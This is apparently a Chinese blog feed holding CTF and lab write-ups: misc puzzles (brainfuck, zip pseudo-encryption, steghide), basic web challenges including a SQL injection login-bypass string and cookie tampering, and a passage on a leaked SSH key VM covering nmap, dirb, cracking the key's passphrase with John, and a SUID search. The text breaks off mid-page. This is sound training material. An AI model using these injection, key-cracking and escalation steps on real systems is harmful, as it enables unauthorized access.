loading="lazy"><br>火星文？？<br>然后我就复制了几行“火星文”放到百度直接查是什么密码，筛选后发现，是一种之前没见过，叫做brainfuck,<br>然后就在线解密拿到flag<br><img src="https://img-blog.csdnimg.cn/2020033120094752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>打开后是一张图片，然后就很自然的foremost分离出来个压缩包，然后发现有密码，先暴力破解，一分钟无果。那可能是伪加密， 打开winhex瞅瞅，搜索十六进制“504B”找了好久，一直找，快怀疑是不是又想错了，最后在“最后面”找到了伪加密的位置<br><img src="https://img-blog.csdnimg.cn/20200331204605203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>改一下，然后打开是个flag.vmdk文件，查百度，然后要到kali进行，拖进kali，然后终端输入<code>7z x flag.vmdk的位置</code>，然后会有<br><img src="https://img-blog.csdnimg.cn/20200331212106203.png" alt="Augenstern" loading="lazy"><br>看到了上面那两个文件，打开<br>第一段是brainfuck密码，<br><img src="https://img-blog.csdnimg.cn/20200331212401755.png" alt="Augenstern" loading="lazy"><br>在线密码破解出来<br><img src="https://img-blog.csdnimg.cn/20200331212345502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二段是OOK<br><img src="https://img-blog.csdnimg.cn/20200331212547902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>同样在线解密网站解出<br><img src="https://img-blog.csdnimg.cn/20200331212636750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag拼接得到。</p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p><img src="https://img-blog.csdnimg.cn/2020033122110489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还是看见图片foremost分离，出来一个压缩包和原来的图片。但是压缩包有密码，<br><img src="https://img-blog.csdnimg.cn/20200331221311535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是因为这个jpg图片有密码。然后打不开，导致整个压缩包都无法解压，但是可以直接拖出来那个压塑包（qwe.zip），<br>然后就可以看到里面是flag的txt文档，然后就去找那个jpg，既然给了jpg，那么那个flag.txt就肯定不是弱口令，没办法短时间爆破，放弃这种想法。<br>看jpg，分析应该是伪加密，（因为我目前也不知道有什么其他办法了），然后直接将用foremost分离出来的那个压缩包直接拖进winhex里进行查看，去后面找，因为伪加密的文件是后面的jpg，所以就要去后面找，也省时间，找到了，就改了它。<br><img src="https://img-blog.csdnimg.cn/20200331222237460.png" alt="Augenstern" loading="lazy"><br>结果改了之后，不行，发现还是没有解开伪加密，思路就断了，想了想实在找不到其他思路（因为做题少），就看了其他师傅的wp，发现我前面的的想法是没错的，只是比较出乎我的意料的就是，它伪加密的地方不止一个，这操作真没想到，改，这次改到最后，一直找504B，我也忘了改了几个，最后是解出来了，可以打开了。再次foremost，什么也没有，我又去观摩师傅们的博客了，然后我就又收获了一个工具steghide<br>kali中安装的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root账户下</span><br><span class="line">apt-get install steghide </span><br><span class="line">普通管理员账户</span><br><span class="line">sudo apt-get install steghide</span><br></pre></td></tr></table></figure><p>接下来解题<br><code>steghide info 路径</code>然后就能找到有这个文件叫做ko.txt<br><img src="https://img-blog.csdnimg.cn/20200331225140446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后输入命令<code>steghide extract -sf 路径</code>在主文件夹创建了一个文件<br><img src="https://img-blog.csdnimg.cn/20200331230109296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开就是………………嘿嘿，还要拖到Windows系统上才能打开，kali打不开txt文件。<br><img src="https://img-blog.csdnimg.cn/20200331230307796.png" alt="Augenstern" loading="lazy"><br>然后这个肯定就是flag.txt的密码了。<br><img src="https://img-blog.csdnimg.cn/20200331230415934.png" alt="Augenstern" loading="lazy"><br>get！！！！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="实验吧注入关最简单的SQL注入"><a href="#实验吧注入关最简单的SQL注入" class="headerlink" title="实验吧注入关最简单的SQL注入"></a>实验吧注入关最简单的SQL注入</h2><p><img src="https://img-blog.csdnimg.cn/20200401150817582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发现是个表单提交的。然后题目说题目里有简单的提示，进去之后先看源码。<img src="https://img-blog.csdnimg.cn/20200401150956638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用户要求用admin，应该是万能密码没错了。构造<code>admin&#39; or &#39;1&#39;=&#39;1#</code><br>密码随便填写，验证码填一下<br><img src="https://img-blog.csdnimg.cn/20200401151218920.png" alt="Augenstern" loading="lazy"><br>答案出来了。</p><h2 id="HAHA浏览器"><a href="#HAHA浏览器" class="headerlink" title="HAHA浏览器"></a>HAHA浏览器</h2><p><img src="https://img-blog.csdnimg.cn/20200401212713250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>安装浏览器，，，肯定不至于。<br>抓个包，送到repeater，将浏览器改为HAHA就可以了然后Go。得到flag<br><img src="https://img-blog.csdnimg.cn/20200401214910778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h2><p><img src="https://img-blog.csdnimg.cn/20200401220451712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个一个链接点进去，让找key，<br><img src="https://img-blog.csdnimg.cn/20200401220839224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后猜测可能是中间跳转了，之前有过这样一道题，再来一遍<br>回到初始页面复制题目链接（我在火狐抓的）<br>点击到这里找key，抓到包后，send to repeater<br>点Go<br><img src="https://img-blog.csdnimg.cn/20200401222359104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了信息，改一下url的信息<br>再Go<br><img src="https://img-blog.csdnimg.cn/20200401222541128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>找到key</p><h2 id="冒充用户登录"><a href="#冒充用户登录" class="headerlink" title="冒充用户登录"></a>冒充用户登录</h2><p><img src="https://img-blog.csdnimg.cn/20200401224015131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这种题点进去直接看大多数都是没什么结果，还是看一下。不出意料还是什么都没有。直接抓包<br><img src="https://img-blog.csdnimg.cn/20200401224153219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>send to repeater,<br><img src="https://img-blog.csdnimg.cn/20200401224254975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到cookie了，还有login=0.那0不行就改个1 ，Go<br><img src="https://img-blog.csdnimg.cn/20200401224415587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>拿到key</p><h2 id="就不让你访问"><a href="#就不让你访问" class="headerlink" title="就不让你访问"></a>就不让你访问</h2><p><img src="https://img-blog.csdnimg.cn/20200401232400954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我万能的抓包不管用了，，，，什么信息都没有找到。。<br>让找admin的那一页，关键是把index改成admin它也不对啊<br>想起来个已经蒙灰了的工具——御剑<br><img src="https://img-blog.csdnimg.cn/20200401233748745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>扫了半天出来个robots协议。<br>看看里面有啥吧<br><img src="https://img-blog.csdnimg.cn/20200401233901978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不让访问这个？？那就搞它。<br><img src="https://img-blog.csdnimg.cn/20200401234027205.png" alt="Augenstern" loading="lazy"><br>没有，，接着找？<br>login，反正也找不到其他信息，那就试试这个吧<br>在url后面加上login.php，没想到还真出来了<br><img src="https://img-blog.csdnimg.cn/20200401234157180.png" alt="Augenstern" loading="lazy"><br>拿到key。到这里，网络安全实验室的基础关就闯完了。以后可以尝试后面的了。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h2><p>打开是一个python文件，然后就放到kali里跑了一下，就出来flag了。（过程比较快，我拿手机拍下来的o((⊙﹏⊙))o.）</p><h2 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h2><p>这道题编码太长，在线解密工具不能用了，解不了。这就要用到一个神器就是converter。将整页的base64编码复制进输入框<br><img src="https://img-blog.csdnimg.cn/20200401083509102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这密码真长，把我软件都给我整卡了。<br>然后复制输出到输入，再Unescape解码<br>复制输出到输入，进行Hex to Text解码<br>复制输出到输入，再次进行Unescape解码<br>然后出现了这样<br><img src="https://img-blog.csdnimg.cn/20200401084204309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里string fromCharCode是Javascript里面的函数，大括号里面是参数。<br>复制里面的参数到输入框中，进行Dec to Text解码<br>复制输出到输入，进行Decode HTML解码<br><img src="https://img-blog.csdnimg.cn/20200401084855927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后找个在线解密网站进行Unicode编码转换<br><img src="https://img-blog.csdnimg.cn/20200401084948696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag%7Bctf_tfc201717qwe%7D<br>%7B和%7D分别表示{}<br>┏┛墓┗┓…(((m -__-)m这题也是没谁了。算了，好记性不如烂笔头。</p><h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><p>贝斯家族，我就知道base16、base32、base64.其他都不知道，通过这道题了解到了还有base36、base58、base62、base91、base92、base85、害，人菜起来真是自己都服，这道题就是base91。可以先自己了解下，再找在线解密网站解。<img src="https://img-blog.csdnimg.cn/20200401140138285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="fuqiangminzhu"><a href="#fuqiangminzhu" class="headerlink" title="fuqiangminzhu"></a>fuqiangminzhu</h2><p><img src="https://img-blog.csdnimg.cn/20200401140305540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题是我没见过得编码，但是找wp，找到一个在线解码的网站解出来的。<br><img src="https://img-blog.csdnimg.cn/20200401140536612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>虽然看着步骤简单，但是却是我没见过的。记录一下。</p><h2 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h2><p>这个想了好久，试了几次其他的解密方式，都不行。凯撒不对，变异凯撒也不是……栅栏，Wi型的栅栏，都不对。实在想不出来哪个加密里面有@@的。而且是明显看着没有其他的加密了，能看到第二个字母是f,只能在216534上面找了。突然想到一个没有什么套路的想法，感觉不对，还是试了试。但是抓到线索了<br><img src="https://img-blog.csdnimg.cn/20200401143102567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是第一次尝试，失败。。。。进行第二次……<br><img src="https://img-blog.csdnimg.cn/2020040114240459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里再用栅栏就能解密成功了。6字一栏<br>4月1日的最后时刻说一声：愚人节快乐！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SSH-私钥泄露</title>
      <link href="/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/08/23/CTF%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94SSH-%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个比较好玩，玩一下。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>ssh-私钥泄露靶机<br>kali攻击机<br>安装靶机<br><img src="https://img-blog.csdnimg.cn/20200527173134439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后设置虚拟机的联网方式，因为是自己的靶机，不知道IP地址，所以前期工作需要安排一下。kali的网络连接方式要设置成和ssh-私钥泄露的一样。<br>因为我前段时间不知道怎么设置，所以探测不到靶机IP，导致没办法做这个实验。今天又看到它了，决定玩一下。下面给出两种设置方法，可以都尝试一下并选择适合自己配置的方法。</p><h2 id="重要设置"><a href="#重要设置" class="headerlink" title="重要设置"></a>重要设置</h2><p>一、两台虚拟机都设置成桥接，如图所示<br><img src="https://img-blog.csdnimg.cn/2020052717462014.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>两个都设置成这样。就可以等下一步去测试IP地址了。<br>不过我使用这个办法行不通，而且看了几个博客，都是这么设置的。我死活都探测不出来靶机IP。我就自己摸索到了第二个方法。适合我的。<br>二、两台虚拟机都设置成NAT连接。<br><img src="https://img-blog.csdnimg.cn/20200527174933206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>记得改过配置后进行重启。才能生效。<br>这个我是测试过的。可以行得通。</p><h1 id="实验前需要"><a href="#实验前需要" class="headerlink" title="实验前需要"></a>实验前需要</h1><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>测试靶机IP地址<br>打开kali<br>输入ifconfig查看当前IP<br>但是出了个错<br><img src="https://img-blog.csdnimg.cn/20200527175800549.png" alt="j4y" loading="lazy"><br>很无语，这个问题解决也挺简单的，就是将ifconfig加入环境变量当中<br><img src="https://img-blog.csdnimg.cn/20200527180732890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>按照图中的步骤来，将ifconfig加入环境变量<br>主要命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>  <span class="comment">#打印环境变量的内容</span></span><br><span class="line">whereis ifconfig <span class="comment"># ifconfig的位置</span></span><br></pre></td></tr></table></figure><p>探测靶机IP<br>已经查出kali攻击机的IP是<code>192.168.40.132</code><br>然后查询当前同一网段存活的IP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">40.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>普通用户加sudo<br><img src="https://img-blog.csdnimg.cn/20200527181348429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个是靶机IP，(挨个试出来的)<br>怎么判断是不是靶机IP？<br>用nmap扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sV</span> <span class="number">192.168</span>.<span class="number">40.143</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200527181558476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看到这个IP开启了ssh服务。<br>所以它就是靶机的IP。<br><code>192.168.40.143</code></p><h1 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>非常直接——拿到flag</p><h2 id="第一个flag"><a href="#第一个flag" class="headerlink" title="第一个flag"></a>第一个flag</h2><p>使用nmap进行信息扫描，查找有用信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sV</span> <span class="number">192.168</span>.<span class="number">40.143</span></span><br></pre></td></tr></table></figure><p>发现其开启的服务有ssh和http服务。<br><img src="https://img-blog.csdnimg.cn/20200527182604429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>常用端口范围是0-1023端口，在扫描结果中查找特殊端口。<br>针对特殊端口进行探测，尤其对开发大端口的http服务进行排查。<br>看到一个不常见的端口，31337端口。是http服务的。就可以访问一下。(其他的也都是了一遍，没有发现东西)<br>访问查看<br><img src="https://img-blog.csdnimg.cn/20200527182835608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看页面源代码，但是没有任何信息。<br><img src="https://img-blog.csdnimg.cn/20200527183531878.png" alt="j4y" loading="lazy"><br>然后使用dirb命令对这个服务的隐藏文件进行探测。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">40.143</span>:<span class="number">31337</span>/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200527183843396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看robots协议。robots协议是禁止爬虫爬取的地方。<br><img src="https://img-blog.csdnimg.cn/20200527183012731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>挨个查看，也就三个。<br>找到了第一条flag<br><img src="https://img-blog.csdnimg.cn/20200527183208204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="第二个flag"><a href="#第二个flag" class="headerlink" title="第二个flag"></a>第二个flag</h2><p>在上面还看到了<code>.ssh</code>，同样的也对它进行访问。<br>查看效果，对于源代码，可能会获取flag，或者下一步的提示。<br>挖掘ssh信息，不断访问获取更多泄露的ssh密钥信息。<br><img src="https://img-blog.csdnimg.cn/20200527184442923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看源码后，没有找到有效信息。<br>然后考虑这些信息是否是一个文件，可以进行尝试。<br><img src="https://img-blog.csdnimg.cn/20200527184812230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>的确是文件，进行下载。<br>还有第二个认证关键字文件，也要下载。<br>然后将私钥文件进行赋权限，赋给它可读可写的权限。<br>先查看它的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> <span class="literal">-alh</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200527185345711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出它并不是完全的可读可写。<br>可读可写的话，就可以进行ssh</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="literal">-i</span> id_rsa [用户名]@<span class="number">192.168</span>.<span class="number">40.143</span></span><br></pre></td></tr></table></figure><p>用户名不知道，查看认证文件<br><img src="https://img-blog.csdnimg.cn/20200527203242278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>用户名应该就是simon了。<br>进行连接<br><img src="https://img-blog.csdnimg.cn/20200527204118309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看到连接时需要指纹识别，然后输入yes，发现连接失败了。看信息是没有权限。然后就给权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">600</span> id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200527204435908.png" alt="j4y" loading="lazy"><br>看到了权限有了，重新尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200527204624546.png" alt="j4y" loading="lazy"><br>还要输入密码，但是不知道密码，就尝试输入simon还有123456之类的密码，错了三次就退出来了。<br>现在就是尝试深入探测信息。<br>解密ssh密钥信息<br>使用ssh2john 将id_rsa密钥转换成John可以识别的信息。<br>过程中发现找不到ssh2john这个命令，于是找了网上大佬的方法。<br>找到<code>ssh2john</code>的位置，然后用python直接运行。<br>终于可以转换成功了。<br><img src="https://img-blog.csdnimg.cn/20200527211726274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>因为我的python默认设置为python3，所以要用python2区分。<br>然后使用John，利用字典，破解密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | sudo john -<span class="literal">-pipe</span> -<span class="literal">-rules</span> rsacrack</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200527214709869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>原本的命令是没有sudo的，但是没有执行不了，可能是因为我用的是普通用户的原因吧。这里可以看出密码是什么了。密码：<code>starwars</code><br>再次进行ssh连接<br><img src="https://img-blog.csdnimg.cn/20200527214944596.png" alt="j4y" loading="lazy"><br>连接成功。<br>但是，找来找去没有找到有用的信息、<br><img src="https://img-blog.csdnimg.cn/2020052721531277.png" alt="j4y" loading="lazy"><br>可能登录的不是root权限，现在开始获取root权限，深入探测根目录。<br><img src="https://img-blog.csdnimg.cn/20200527215547834.png" alt="j4y" loading="lazy"><br>在根目录找到了 flag.txt但是权限不够。<br>说明simon只是一个普通用户，不是root用户组里的成员。所以要提升权限。<br>首先查找具有root权限的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查看到了这样的<br><img 